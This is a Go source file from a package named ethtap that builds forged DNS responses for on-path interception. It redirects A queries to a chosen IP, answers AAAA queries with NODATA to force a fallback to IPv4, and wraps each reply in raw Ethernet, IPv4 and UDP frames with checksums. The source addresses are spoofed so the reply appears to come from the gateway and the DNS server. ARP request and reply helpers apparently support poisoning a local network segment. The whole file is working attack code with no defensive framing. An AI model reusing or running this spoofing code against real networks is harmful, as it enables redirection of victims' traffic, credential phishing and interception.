package ethtap

import (
	"encoding/binary"
	"errors"
	"net"
	"strings"
)

// dnsQuestionName returns the (uncompressed) first question name of a DNS
// message. Compression pointers are followed defensively.
func dnsQuestionName(msg []byte) (string, bool) {
	if len(msg) < 12 {
		return "", false
	}
	qd := binary.BigEndian.Uint16(msg[4:6])
	if qd == 0 {
		return "", false
	}
	name, _, ok := readDNSName(msg, 12)
	return name, ok
}

func readDNSName(msg []byte, off int) (string, int, bool) {
	var sb strings.Builder
	pos := off
	next := off
	jumped := false
	for steps := 0; steps < 64; steps++ {
		if pos >= len(msg) {
			return "", 0, false
		}
		l := int(msg[pos])
		if l == 0 {
			pos++
			if !jumped {
				next = pos
			}
			return sb.String(), next, true
		}
		if l&0xc0 == 0xc0 {
			if pos+1 >= len(msg) {
				return "", 0, false
			}
			ptr := int(binary.BigEndian.Uint16(msg[pos:pos+2]) & 0x3fff)
			if !jumped {
				next = pos + 2
				jumped = true
			}
			pos = ptr
			continue
		}
		if pos+1+l > len(msg) {
			return "", 0, false
		}
		if sb.Len() > 0 {
			sb.WriteByte('.')
		}
		sb.Write(msg[pos+1 : pos+1+l])
		pos += 1 + l
	}
	return "", 0, false
}

// BuildDNSSpoof turns an A query into a forged answer pointing at ip. AAAA and
// other types get a NODATA reply so the client falls back to IPv4.
func BuildDNSSpoof(query []byte, ip net.IP, ttl uint32) ([]byte, string, bool) {
	v4 := ip.To4()
	if len(query) < 12 || v4 == nil {
		return nil, "", false
	}
	if query[2]&0x80 != 0 { // already a response
		return nil, "", false
	}
	if binary.BigEndian.Uint16(query[4:6]) != 1 {
		return nil, "", false
	}
	name, qEnd, ok := readDNSName(query, 12)
	if !ok || qEnd+4 > len(query) {
		return nil, "", false
	}
	qtype := binary.BigEndian.Uint16(query[qEnd : qEnd+2])
	question := query[12 : qEnd+4]

	resp := make([]byte, 12, 12+len(question)+16)
	copy(resp, query[:12])
	resp[2] = 0x80 | (query[2] & 0x79) // QR=1, keep opcode/RD, clear AA/TC
	resp[3] = 0x80                     // RA=1, RCODE=0
	binary.BigEndian.PutUint16(resp[4:6], 1)
	if qtype == 1 {
		binary.BigEndian.PutUint16(resp[6:8], 1)
	} else {
		binary.BigEndian.PutUint16(resp[6:8], 0)
	}
	binary.BigEndian.PutUint16(resp[8:10], 0)
	binary.BigEndian.PutUint16(resp[10:12], 0)
	resp = append(resp, question...)
	if qtype == 1 {
		answer := make([]byte, 16)
		answer[0], answer[1] = 0xc0, 0x0c // pointer to the question name
		binary.BigEndian.PutUint16(answer[2:4], 1)
		binary.BigEndian.PutUint16(answer[4:6], 1)
		binary.BigEndian.PutUint32(answer[6:10], ttl)
		binary.BigEndian.PutUint16(answer[10:12], 4)
		copy(answer[12:16], v4)
		resp = append(resp, answer...)
	}
	return resp, name, true
}

// DNSReplyFrame wraps a forged DNS payload in Ethernet/IPv4/UDP, answering the
// original query. The Ethernet source is the original destination MAC (the
// gateway), so on the wire the reply looks like it came from the DNS server.
func DNSReplyFrame(query Packet, payload []byte) ([]byte, error) {
	if len(query.DstMAC) != 6 || len(query.SrcMAC) != 6 || query.SrcIP == nil || query.DstIP == nil {
		return nil, errors.New("incomplete query")
	}
	if query.SrcIP.To4() == nil || query.DstIP.To4() == nil {
		return nil, errors.New("not IPv4")
	}
	udpLen := 8 + len(payload)
	total := 20 + udpLen
	frame := make([]byte, 14+total)
	copy(frame[0:6], query.SrcMAC)
	copy(frame[6:12], query.DstMAC)
	frame[12], frame[13] = 0x08, 0x00

	ip := frame[14 : 14+total]
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:4], uint16(total))
	binary.BigEndian.PutUint16(ip[4:6], uint16(query.SrcPort)) // arbitrary id
	ip[8] = 64
	ip[9] = 17
	copy(ip[12:16], query.DstIP.To4())
	copy(ip[16:20], query.SrcIP.To4())
	binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip[:20]))

	udp := ip[20:]
	binary.BigEndian.PutUint16(udp[0:2], 53)
	binary.BigEndian.PutUint16(udp[2:4], query.SrcPort)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
	copy(udp[8:], payload)
	binary.BigEndian.PutUint16(udp[6:8], udpChecksum(ip[12:16], ip[16:20], udp))
	return frame, nil
}

func ipChecksum(hdr []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(hdr); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(hdr[i : i+2]))
	}
	if len(hdr)%2 == 1 {
		sum += uint32(hdr[len(hdr)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func udpChecksum(src, dst, udp []byte) uint16 {
	var sum uint32
	add := func(b []byte) {
		for i := 0; i+1 < len(b); i += 2 {
			sum += uint32(binary.BigEndian.Uint16(b[i : i+2]))
		}
		if len(b)%2 == 1 {
			sum += uint32(b[len(b)-1]) << 8
		}
	}
	add(src)
	add(dst)
	sum += 17
	sum += uint32(len(udp))
	add(udp)
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// arpRequestFrame asks the segment who holds targetIP, using srcMAC/srcIP.
func arpRequestFrame(srcMAC net.HardwareAddr, srcIP, targetIP net.IP) []byte {
	v4src, v4dst := srcIP.To4(), targetIP.To4()
	if len(srcMAC) != 6 || v4src == nil || v4dst == nil {
		return nil
	}
	frame := make([]byte, 14+28)
	copy(frame[0:6], []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff})
	copy(frame[6:12], srcMAC)
	frame[12], frame[13] = 0x08, 0x06
	arp := frame[14:]
	binary.BigEndian.PutUint16(arp[0:2], 1)
	binary.BigEndian.PutUint16(arp[2:4], 0x0800)
	arp[4], arp[5] = 6, 4
	binary.BigEndian.PutUint16(arp[6:8], 1) // request
	copy(arp[8:14], srcMAC)
	copy(arp[14:18], v4src)
	copy(arp[24:28], v4dst)
	return frame
}

// parseARPReply reports the sender IP of an ARP reply carrying the given MAC.
func parseARPReply(frame []byte) (net.IP, bool) {
	if len(frame) < 42 {
		return nil, false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != 0x0806 {
		return nil, false
	}
	arp := frame[14:]
	if binary.BigEndian.Uint16(arp[6:8]) != 2 {
		return nil, false
	}
	return net.IP(arp[14:18]), true
}
